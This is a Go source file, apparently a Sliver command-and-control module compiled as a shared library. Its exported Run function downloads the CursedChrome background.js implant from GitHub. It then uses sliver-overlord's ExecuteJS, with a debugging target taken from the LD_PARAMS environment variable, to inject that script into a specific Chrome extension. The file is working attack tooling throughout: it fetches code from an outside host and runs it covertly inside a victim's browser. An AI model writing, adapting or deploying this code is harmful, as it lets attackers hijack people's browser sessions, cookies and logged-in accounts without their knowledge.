package main

import (
	"io/ioutil"
	"net/http"
	"os"

	"github.com/moloch--/sliver-overlord/pkg/overlord"
)

import "C"

func fetchSource() (string, error) {
	url := "https://raw.githubusercontent.com/mandatoryprogrammer/CursedChrome/master/extension/src/bg/background.js"
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), err
}

//export Run
func Run() {
	remote := os.Getenv("LD_PARAMS")
	jsStr, err := fetchSource()
	if err != nil {
		panic(err)
	}
	overlord.ExecuteJS(remote, jsStr, "cjpalhdlnbpafiamejdnhcphjbkeiagm")
}

func main() {
}
